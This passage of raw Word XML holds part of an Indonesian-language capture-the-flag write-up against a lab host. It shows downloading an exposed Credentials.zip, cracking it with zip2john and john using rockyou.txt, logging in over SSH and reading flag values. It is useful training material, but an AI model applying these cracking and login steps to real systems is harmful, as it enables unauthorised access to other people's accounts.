      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A06B25">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> tools john</w:t>
      </w:r>
      <w:r w:rsidR="00C417EA">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C417EA">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>kita</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C417EA">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> download </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C417EA">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dulu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C417EA">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C417EA">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>filenya</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C417EA">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> di kali </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C417EA">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C417EA">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E01618">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidR="0004496A">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">an di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0004496A">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>jadikan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0004496A">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00FB2CF7">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">hash </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00FB2CF7">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>fil</w:t>
      </w:r>
      <w:r w:rsidR="00F971B9">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>enya</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F971B9">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> dengan </w:t>
      </w:r>
      <w:r w:rsidR="00E01618">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>command:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC3E31D" w14:textId="5A841845" w:rsidR="00E01618" w:rsidRDefault="00FD1EB7" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Wget </w:t>
      </w:r>
      <w:hyperlink r:id="rId24" w:history="1">
        <w:r w:rsidR="00F971B9" w:rsidRPr="00D93F73">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>http://192.168.56.107/admin/dashboard/Files_Backup2024/Credentials.zip</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00F971B9">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (download)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63531C24" w14:textId="38CCBD7E" w:rsidR="00F971B9" w:rsidRDefault="00751E2A" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Adobe Gothic Std B" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00751E2A">
        <w:rPr>
          <w:rFonts w:eastAsia="Adobe Gothic Std B" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">zip2john Credentials.zip &gt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00751E2A">
        <w:rPr>
          <w:rFonts w:eastAsia="Adobe Gothic Std B" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>zip.hash</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Adobe Gothic Std B" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000F5722">
        <w:rPr>
          <w:rFonts w:eastAsia="Adobe Gothic Std B" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(converter file)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F4627E" w14:textId="4895E4EC" w:rsidR="00C77CD9" w:rsidRDefault="00C77CD9" w:rsidP="00C77CD9">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5D781CC4" wp14:editId="07FFD662">
            <wp:extent cx="6035040" cy="2075088"/>
            <wp:effectExtent l="0" t="0" r="3810" b="1905"/>
            <wp:docPr id="1264141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09" cy="21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887A" w14:textId="54E4E649" w:rsidR="00533C60" w:rsidRPr="00751E2A" w:rsidRDefault="00533C60" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="459BDE0F" w14:textId="77777777" w:rsidR="00764298" w:rsidRDefault="00764298" w:rsidP="00C77CD9">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F697A19" w14:textId="77777777" w:rsidR="00A65E0F" w:rsidRDefault="00A65E0F" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7115662B" w14:textId="77777777" w:rsidR="00A65E0F" w:rsidRDefault="00A65E0F" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="030F5F8F" w14:textId="77777777" w:rsidR="00A65E0F" w:rsidRDefault="00A65E0F" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C1AEE55" w14:textId="7FD1AEB0" w:rsidR="00764298" w:rsidRDefault="001D1D6D" w:rsidP="00CF54B0">
      <w:pPr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23131">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>nge</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00523131">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> brute force </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00523131">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>filenya</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00523131">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000267AE">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">dengan </w:t>
      </w:r>
      <w:r w:rsidR="007A3E0F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tools john</w:t>
      </w:r>
      <w:r w:rsidR="005D220A">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="005D220A">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>menggunakan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A65E0F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wordlist rockyou.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="762B9C5F" w14:textId="021AD071" w:rsidR="00B356FD" w:rsidRDefault="00B356FD" w:rsidP="00B356FD">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00105E44">
        <w:rPr>
          <w:rFonts w:ascii="Adobe Gothic Std B" w:eastAsia="Adobe Gothic Std B" w:hAnsi="Adobe Gothic Std B"/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251660288" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="59BB3021" wp14:editId="7D323AD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595110" cy="1184910"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapNone/>
            <wp:docPr id="394643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3028" r="48291" b="10789"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="65951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BDE17" w14:textId="77777777" w:rsidR="00A65E0F" w:rsidRDefault="00A65E0F" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D2995DF" w14:textId="77777777" w:rsidR="00764298" w:rsidRDefault="00764298" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C1483C1" w14:textId="77777777" w:rsidR="00764298" w:rsidRDefault="00764298" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AF7C81B" w14:textId="77777777" w:rsidR="00764298" w:rsidRDefault="00764298" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5483B619" w14:textId="739C64CF" w:rsidR="00764298" w:rsidRDefault="00877C07" w:rsidP="00CF54B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10382">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>masukan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00110382">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> username dan password yang </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00110382">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>muncul</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00110382">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00110382">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00D716C2">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="00110382">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>telah</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00D716C2">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00D716C2">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>terbuka</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00D716C2">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00D716C2">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>filenya</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6F1F7174" w14:textId="1854F730" w:rsidR="0010005E" w:rsidRDefault="0010005E" w:rsidP="0010005E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5357ECAC" wp14:editId="14FBF204">
            <wp:extent cx="5787827" cy="3355450"/>
            <wp:effectExtent l="0" t="0" r="3810" b="0"/>
            <wp:docPr id="1158565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418" cy="337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AC4B" w14:textId="57FEBD22" w:rsidR="00DF5548" w:rsidRDefault="00F34A7C" w:rsidP="00DF5548">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2642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flag pada file credentials.zip</w:t>
      </w:r>
      <w:r w:rsidR="003674FB">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="003674FB">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">   (</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="003674FB">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">john crack) </w:t>
      </w:r>
      <w:r w:rsidR="00722FF7">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>FLAG:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="473B6B06" w14:textId="1A053714" w:rsidR="00722FF7" w:rsidRPr="00722FF7" w:rsidRDefault="00722FF7" w:rsidP="00DF5548">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2642"/>
        </w:tabs>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00722FF7">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>FLAG{0xJ0hnCr4ckM3}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A7C3F1" w14:textId="77777777" w:rsidR="00DF5548" w:rsidRDefault="00DF5548" w:rsidP="00CD6C99">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22E78E7B" w14:textId="77777777" w:rsidR="00DF5548" w:rsidRDefault="00DF5548" w:rsidP="00CD6C99">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66823B7B" w14:textId="77777777" w:rsidR="00DF5548" w:rsidRDefault="00DF5548" w:rsidP="00CD6C99">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10ACC77E" w14:textId="77777777" w:rsidR="00152218" w:rsidRDefault="00152218" w:rsidP="00152218">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BD285BB" w14:textId="31652798" w:rsidR="00764298" w:rsidRDefault="007A7885" w:rsidP="001522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Kita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r w:rsidR="00CD6C99">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">meng SSH Server </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CD6C99">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>dari</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CD6C99">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> web CTF </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CD6C99">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>nya</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="41CFD86C" w14:textId="671ED30E" w:rsidR="006F02DC" w:rsidRDefault="003B29BD" w:rsidP="00722FF7">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="006F02DC">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ommand</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">: ssh </w:t>
      </w:r>
      <w:hyperlink r:id="rId28" w:history="1">
        <w:r w:rsidRPr="00D93F73">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>ichigo@192.168.56.107</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="193B7421" w14:textId="530EA99F" w:rsidR="003B29BD" w:rsidRDefault="003B29BD" w:rsidP="00722FF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Dan </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>masukan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AFD947B" w14:textId="52128A00" w:rsidR="00B1194E" w:rsidRDefault="00B1194E" w:rsidP="00152218">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="057B6C7C" wp14:editId="4B9A66F8">
            <wp:extent cx="5192202" cy="2710815"/>
            <wp:effectExtent l="0" t="0" r="8890" b="0"/>
            <wp:docPr id="344863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97" cy="271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0220" w14:textId="31BC5AFA" w:rsidR="00BE4FE7" w:rsidRDefault="00A84679" w:rsidP="00A846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flag </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00152218">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ketika</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00152218">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00152218">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>kita</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00152218">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00152218">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tampilkan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00152218">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00152218">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r w:rsidR="00787E6B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>lagnya</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00787E6B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> dengan command: cat flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="353A63B9" w14:textId="3BB8E533" w:rsidR="00787E6B" w:rsidRPr="006105D3" w:rsidRDefault="00842D30" w:rsidP="00A84679">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E87B4D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>FLAG{0xLowUs3</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00E87B4D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>rw!thSSH</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00E87B4D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
      <w:r w:rsidR="00820755">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
      <w:r w:rsidR="006105D3" w:rsidRPr="006105D3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="006105D3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidR="006105D3" w:rsidRPr="006105D3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">ow </w:t>
      </w:r>
      <w:r w:rsidR="006105D3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r w:rsidR="006105D3" w:rsidRPr="006105D3">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ser SSH)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="349BB4F0" w14:textId="77777777" w:rsidR="00BE4FE7" w:rsidRDefault="00BE4FE7" w:rsidP="00575E1E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4592E624" w14:textId="77777777" w:rsidR="00BE4FE7" w:rsidRDefault="00BE4FE7" w:rsidP="00575E1E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25780AAC" w14:textId="77777777" w:rsidR="004529AF" w:rsidRDefault="004529AF" w:rsidP="00575E1E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="313BE197" w14:textId="77777777" w:rsidR="004529AF" w:rsidRDefault="004529AF" w:rsidP="00575E1E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7392E403" w14:textId="77777777" w:rsidR="004529AF" w:rsidRDefault="004529AF" w:rsidP="00575E1E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="28"/>
